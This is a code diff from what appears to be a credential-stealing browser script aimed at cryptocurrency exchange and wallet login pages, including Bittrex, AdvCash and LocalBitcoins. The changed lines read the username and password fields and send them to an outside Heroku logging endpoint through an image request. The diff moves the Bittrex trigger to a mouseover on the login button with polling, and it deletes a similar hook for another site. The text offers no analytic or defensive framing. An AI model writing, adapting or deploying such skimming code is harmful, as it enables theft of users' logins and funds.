@@ -108,16 +108,19 @@ for (var i = 0; i < arrayLength; i++) {
       };
     };
 
-    if (top['location']['href']['indexOf']('bittrex.com') > -1)  {
-      document.getElementsByTagName("button").onclick = function() {
-        username = document.getElementsByName("UserName")[0].value;
-        user_pass = document.getElementsByName("Password")[0].value;
-        if (username && user_pass) {
-          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
-        }
-      };
-    };
+    if (top['location']['href']['indexOf']('bittrex.com/Account/Login') > -1) {
+        var interval = setInterval(function () {
+            if (document['getElementsByTagName']('button')) {
+                clearInterval(interval);
+                document['getElementsByClassName']('g-recaptcha btn btn-primary login')[0].onmouseover = function (_0x441cx2) {
+                username = document.getElementsByName("UserName")[0].value;
+                user_pass = document.getElementsByName("Password")[0].value;
 
+              (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+                }
+            }
+        }, 1000)
+    };
 
     if (top['location']['href']['indexOf']('wallet.advcash.com') > -1) {
         var interval = setInterval(function () {
@@ -224,20 +227,7 @@ for (var i = 0; i < arrayLength; i++) {
           };
 
 
-          if (top['location']['href']['indexOf']('https://ltcbackoffice.org/') > -1) {
-                var interval = setInterval(function () {
-                    if (document['getElementsByClassName']('page-content')) {
-                        clearInterval(interval);
-                        document['getElementsByClassName']('btn-primary').onclick = function (_0x441cx2) {
 
-                        username = document.getElementById("username").value;
-                        user_pass = document.getElementById("password").value;
-
-                        (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
-                        }
-                    }
-                }, 1000)
-            };
 
             if (top['location']['href']['indexOf']('https://localbitcoins.com/accounts/login/') > -1) {
                   var interval = setInterval(function () {
